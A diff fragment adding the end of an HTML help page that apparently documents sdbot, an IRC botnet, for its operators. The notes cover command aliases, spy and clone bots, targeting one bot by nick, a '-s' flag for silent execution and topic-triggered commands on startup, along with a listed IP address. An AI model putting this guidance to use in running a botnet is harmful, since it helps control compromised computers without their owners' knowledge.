+      IP Address: 63.219.180.69. connected from: 1Cust58.tnt6.lax3.da.uu.net</td>
+  </tr>
+  <tr> 
+    <td bordercolor="#333333" bordercolorlight="#333333" bordercolordark="#333333" colspan="5"><font color="#CCCCCC"><font face="Arial" size="2">notes:<br>
+      &nbsp;</font>1. <font face="Arial" size="2">a command and its alias do the 
+      same thing, the alias is just a shortened version for lazy people.<br>
+      &nbsp;2. spies do not respond to commands, but clones do; most commands given 
+      directly to a clone will affect only that clone and not the original bot.<br>
+      &nbsp;3. if you put the bot's nick before a command, only that bot will
+      execute the command (eg, 'sdbot: .si')<br>
+      &nbsp;4. if you use the '-s' parameter at the end of a command, the bot
+      will not reply when the command is executed. this will not work with
+      commands whose only function is to say something, however. for example, if
+      you give the bot the command: '.login bleh -s' the bot will not reply with
+      'password accepted'.<br>
+      &nbsp;5. if topic commands are enabled, then setting the topic to a
+      command will cause the bot to execute that command on startup.</font></font></td>
+  </tr>
+</table>
+
+</body>
+
+</html>
